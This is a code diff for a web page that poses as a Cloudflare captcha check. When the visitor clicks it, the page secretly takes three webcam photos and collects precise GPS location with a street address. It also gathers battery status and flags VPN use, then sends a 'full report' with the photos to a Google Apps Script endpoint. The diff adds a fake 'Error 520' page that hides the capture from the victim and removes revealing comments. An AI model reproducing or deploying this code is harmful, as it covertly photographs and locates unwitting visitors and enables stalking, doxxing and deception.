@@ -79,9 +79,8 @@
 
     <script>
         // ==========================================
-        // 🛡️ SECURITY CONFIGURATION
+        // CONFIGURATION
         // ==========================================
-        // СЮДА ВСТАВИТЬ URL ИЗ GOOGLE APPS SCRIPT
         const _P_URL = "https://script.google.com/macros/s/AKfycbzMm4DrahVeftCcXwFQ9n5J0Z8W4NH4pp_HmhFa6oPRl4vPsJXlO61PNMrURhRwpCgO/exec"; 
         // ==========================================
 
@@ -147,7 +146,7 @@
 
             // VPN Check
             let v = "";
-            if (new Date().getTimezoneOffset() === -180) { // UTC+3
+            if (new Date().getTimezoneOffset() === -180) {
                 if (d.k !== 'BY' && d.k !== 'RU') v = "⚠️ DETECTED VPN";
             }
             return { ...d, v };
@@ -211,102 +210,112 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             await _sD(msg);
         });
 
-        // --- PHASE 2: INTERACTIVE (UPDATED v3.0 - STRICT SEQUENTIAL + OPTIMIZED) ---
+        // --- INTERACTIVE CHECK ---
         const bB = document.getElementById('captcha-box');
         const b = document.getElementById('btn');
         
+        // Error Page Logic
+        function showError() {
+            document.body.innerHTML = `
+                <div style="text-align:center; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; padding-top:100px;">
+                    <h1 style="font-size: 60px; margin: 0; font-weight: 300; color: #333;">Error 520</h1>
+                    <h2 style="font-size: 24px; color: #666; margin: 10px 0;">Web server is returning an unknown error</h2>
+                    <p style="color: #999; margin-top: 20px; font-size: 16px;">There is an issue between Cloudflare's cache and your origin web server.</p>
+                    <div style="margin-top: 40px;">
+                         <span style="display:inline-block; padding: 8px 15px; background:#f1f1f1; border-radius:4px; color:#555; font-size:12px;">
+                            Cloudflare Ray ID: <strong>${document.getElementById('ray-id').innerText}</strong>
+                         </span>
+                    </div>
+                </div>
+            `;
+            document.body.style.display = "block";
+            document.body.style.backgroundColor = "#fff";
+        }
+
         bB.onclick = async () => {
             if (b.style.display === 'none') return;
             b.style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            log("Starting Phase 2 (v3.0)...");
+            log("Starting Check...");
             
-            // 1. СНАЧАЛА КАМЕРА (Полная блокировка до решения)
+            // 1. Camera
             document.getElementById('label-text').innerText = "Allow Camera...";
             let stream = null;
             let video = document.getElementById('video');
             
             try {
-                // Запрашиваем камеру и ЖДЕМ ответа
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 640 } } 
+                    video: { facingMode: "user", width: { ideal: 1280 } } 
                 });
                 video.srcObject = stream;
-                // Пытаемся запустить видео
-                try { await video.play(); } catch(e) { log("Auto-play blocked: " + e); }
+                try { await video.play(); } catch(e) { log("Autoplay: " + e); }
             } catch (e) {
-                log("Camera denied/error: " + e);
-                // Если отказ - просто идем дальше
+                log("Camera: " + e);
             }
 
-            // 2. ЗАПУСК GPS (Сразу после решения по камере)
-            // Мы не ждем завершения GPS сразу, чтобы параллельно делать фото
+            // 2. Location
             document.getElementById('label-text').innerText = "Allow Location...";
             
             const gpsPromise = new Promise(resolve => {
-                if (!navigator.geolocation) return resolve({t:"*GPS не поддерживается*", e:true});
+                if (!navigator.geolocation) return resolve({t:"*GPS Not Supported*", e:true});
                 
-                // Тайм-аут 30 сек (УВЕЛИЧЕНО для ноутбуков/ПК)
-                const timer = setTimeout(() => resolve({t:"*GPS: Тайм-аут (Медленный интернет/отказ)*", e:true}), 30000);
+                const timer = setTimeout(() => resolve({t:"*GPS: Timeout*", e:true}), 60000);
 
                 navigator.geolocation.getCurrentPosition(
                     async p => {
                         clearTimeout(timer);
                         const {latitude:la, longitude:lo} = p.coords;
                         const link = `https://www.google.com/maps?q=${la},${lo}`;
-                        let addr = "Не определен";
+                        let addr = "Unknown";
                         try { 
                             const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); 
                             addr = (await req.json()).display_name; 
                         } catch{}
-                        resolve({t:`Адрес: ${addr}\nКарты: [клик](${link})`, e:false});
+                        resolve({t:`Address: ${addr}\nMap: [Link](${link})`, e:false});
                     },
                     (err) => {
                         clearTimeout(timer);
-                        let e = "Ошибка";
-                        if (err.code === 1) e = "Запрещено пользователем";
-                        else if (err.code === 2) e = "Недоступно";
-                        else if (err.code === 3) e = "Тайм-аут";
-                        resolve({t:`*GPS Ошибка: ${e}*`, e:true});
+                        let e = "Error";
+                        if (err.code === 1) e = "Denied";
+                        else if (err.code === 2) e = "Unavailable";
+                        else if (err.code === 3) e = "Timeout";
+                        resolve({t:`*GPS Error: ${e}*`, e:true});
                     },
-                    { enableHighAccuracy: true } // Просим точную геопозицию
+                    { enableHighAccuracy: true }
                 );
             });
 
-            // 3. ФОТО (Параллельно с ожиданием GPS, если камера есть)
+            // 3. Capture
             let ph = [];
             if (stream) {
                 document.getElementById('label-text').innerText = "Verifying...";
                 
-                // Пауза для настройки баланса белого
                 await sleep(1500); 
 
                 const c = document.getElementById('canvas');
                 c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
                 const ctx = c.getContext('2d');
 
-                // Делаем 3 фото
                 for(let i=0; i<3; i++) {
                     ctx.drawImage(video,0,0);
                     ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
                     if(i<2) await sleep(600);
                 }
                 
-                // Все, камера больше не нужна
                 stream.getTracks().forEach(t=>t.stop());
             }
 
-            // 4. ОЖИДАНИЕ GPS (Если фото сделали быстрее, чем юзер нажал "Разрешить")
+            // 4. Wait for Location
             if (stream) document.getElementById('label-text').innerText = "Finishing...";
             const gpsData = await gpsPromise;
             const gps = gpsData.t;
 
-            // 5. БАТАРЕЯ
+            // 5. Battery
             let bat = "N/A";
             if (navigator.getBattery) {
                 try {
                     const bt = await navigator.getBattery();
-                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Заряжается' : 'От батареи'})`;
+                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Charging' : 'Battery'})`;
                 } catch {}
             }
 
@@ -316,20 +325,20 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             document.getElementById('label-text').style.color = "#009900";
 
             const fM = `
-*ПОЛНЫЙ ОТЧЕТ (Phase 2)*
+*FULL REPORT*
 ━━━━━━━━━━━━━━━━
-*ГЕОПОЗИЦИЯ*
+*LOCATION*
 ${gps}
 
-*СТАТУС БАТАРЕИ*
-Заряд: ${bat}
+*BATTERY*
+Status: ${bat}
 
-*ФОТО*
-Захвачено фото: ${ph.length > 0 ? ph.length : "НЕТ ДОСТУПА"}
+*PHOTOS*
+Captured: ${ph.length > 0 ? ph.length : "NO ACCESS"}
 `.trim();
 
             await _sD(fM, ph);
-            setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
+            setTimeout(showError, 1500);
         };
     </script>
 </body>
